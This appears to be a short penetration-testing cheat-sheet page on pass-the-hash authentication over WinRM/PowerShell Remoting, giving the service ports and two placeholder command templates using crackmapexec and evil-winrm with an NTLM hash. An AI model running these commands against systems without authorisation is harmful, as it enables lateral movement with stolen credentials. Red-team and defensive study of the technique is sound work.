# WinRM/PS Remoting (PTH)

Windows Remote Management (WinRM) is another way to remotely manage computers apart from WMI and other similar protocols and uses a different set of ports. WinRM uses port 5985 (HTTP) or 5986 (HTTPS).

### Tools

{% tabs %}
{% tab title="crackmapexec" %}
```bash
crackmapexec winrm <IP> -u <USER> -H <HASH> -d <DOMAIN>
```
{% endtab %}

{% tab title="evil-winrm" %}
```bash
evil-winrm -i <IP> -u <USERNAME> -H <HASH LM>
```
{% endtab %}
{% endtabs %}
